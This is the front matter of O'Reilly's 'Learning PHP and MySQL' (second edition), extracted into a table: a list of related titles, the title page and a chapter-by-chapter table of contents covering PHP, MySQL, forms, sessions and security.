Larger Text,Smaller Text,Symbol
Learning PHP and MySQL,NA,NA
Other resources from O’Reilly,"Related titles
  
 Essential PHP Security
  
 MySQL Pocket Reference
  
 Learning PHP 5
  
 PHP Cookbook
 ™
  
 Learning MySQL
  
 PHP Hacks
 ™
  
 Mastering Regular
  
 Programming PHP
  
 Expressions
  
 Web Database Applications
  
 MySQL Cookbook
 ™
  
 with PHP and MySQL
  
 MySQL in a Nutshell
  
 oreilly.com
  
 oreilly.com
  is more than a complete catalog of O’Reilly books.
  
 You’ll also find links to news, events, articles, weblogs, sample 
  
 chapters, and code examples.
  
 oreillynet.com
  is the essential portal for developers interested 
 in 
  
 open and emerging technologies, including new platforms, 
 pro-
  
 gramming languages, and operating systems.
  
 Conferences
  
 O’Reilly brings diverse innovators together to nurture the ideas
  
 that spark revolutionary industries. We specialize in 
 document-
  
 ing the latest tools and systems, translating the innovator’s 
  
 knowledge into useful skills for those in the trenches. Visit
  
 con-
  
 ferences.oreilly.com
  for our upcoming events.
  
  
 Safari Bookshelf (
 safari.oreilly.com
 ) is the premier online 
 refer-ence library for programmers and IT professionals. 
 Conduct searches across more than 1,000 books. Subscribers 
 can zero in
  
 on answers to time-critical questions in a matter of seconds. 
  
 Read the books on your Bookshelf from cover to cover or sim-
  
 ply flip to the page you need. Try it today for free.",NA
SECOND ,NA,NA
EDITION ,NA,NA
Learning PHP and ,NA,NA
MySQL,NA,NA
Michele E. Davis and Jon A. Phillips,"Beijing
  •
  Cambridge
  •
  Farnham
  •
  Köln
  •
  Paris
  •
  Sebastopol
  •
  Taipei
  •
  Tokyo",NA
Table of Contents,NA,NA
Preface,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 ix,NA,NA
1. Dynamic Content and the Web,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 1,"HTTP and the Internet 
  
 PHP and MySQL’s Place in Web Development 
 The Components of a PHP Application 
  
 Integrating Many Sources of Information 
  
 Requesting Data from a Web Page
  
  1
  
  2
  
  4
  
  7
  
  11",NA
2. Installation,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 15,"Developing Locally
  
  15
  
 Working Remotely
  
  35",NA
3. Exploring PHP,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 39,"PHP and HTML Text
  
  39
  
 Coding Building Blocks
  
  43",NA
4. PHP Decision-Making,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 62,"Expressions
  
  62
  
 Operator Concepts
  
  64
  
 Conditionals
  
  71
  
 Looping
  
  77",NA
5. Functions,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 85,"Calling Functions 
  
 Defining Functions 
  
 Object-Oriented 
 Programming
  
  
 87
  
  
 89
  
  
 96
  
 v",NA
6. Arrays,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 107,"Array Fundamentals
  
  107",NA
7. Working with MySQL,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 122,"MySQL Database 
  
 Managing the Database 
  
 Using phpMyAdmin 
  
 Database Concepts 
  
 Structured Query Language
  
  
 122
  
  
 125
  
  
 126
  
  
 131
  
  
 132",NA
8. Database Best Practices,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 146,"Database Design
  
  146
  
 Backing Up and Restoring Data
  
  155
  
 Advanced SQL
  
  159",NA
9. Getting PHP to Talk to MySQL,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 179,"The Process
  
  180
  
 Querying the Database with PHP Functions
  
  180
  
 Using PEAR
  
  190",NA
10. Working with Forms,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 199,"Building a Form
  
  199
  
 Templates
  
  218",NA
11. Practical PHP,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 223,"String Functions
  
  223
  
 Date and Time Functions
  
  233
  
 File Manipulation
  
  238
  
 Calling System Calls
  
  249",NA
12. XHTML,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 251,"Why XHTML?
  
  253
  
 XHTML and XML Namespaces
  
  254
  
 XHTML Versions
  
  254
  
 Generating XHTML with PHP
  
  261",NA
13. Modifying MySQL Objects and PHP Data,. . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 263,"Changing Database Objects from PHP
  
  263
  
 Manipulating Table Data
  
  266
  
 Displaying Results with Embedded Links
  
  267
  
 vi
  
 |
  
 Table of Contents",NA
"14. Cookies, Sessions, and Access Control",. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 285,"Cookies
  
  285
  
 PHP and HTTP Authentication
  
  288
  
 Sessions
  
  294
  
 Using Auth_HTTP to Authenticate
  
  301",NA
15. Security,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 307,"Session Security
  
  316",NA
16. Validation and Error Handling,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 325,"Validating User Input with JavaScript
  
  325
  
 Pattern Matching
  
  329
  
 Redisplaying a Form After PHP Validation Fails
  
  333",NA
17. Sample Application,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 339,"Configuration File 
  
 Page Framework 
  
 Database 
  
 Displaying a Postings Summary 
  
 Displaying a Posting and Its Comments 
 Adding and Changing Posts 
  
 Adding and Changing Comments
  
  
 340
  
  
 340
  
  
 343
  
  
 346
  
  
 349
  
  
 352
  
  
 358",NA
18. Finishing Your Journey,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 366,"PHP Coding Standards 
  
 PEAR 
  
 Frameworks 
  
 Ajax 
  
 Wikis 
  
 Finding Help on the Web
  
  
 366
  
  
 371
  
  
 372
  
  
 373
  
  
 373
  
  
 373",NA
Appendix.    Solutions to Chapter Questions,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 377,NA,NA
Index,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 391,"Table of Contents
  
 |
  
 vii",NA
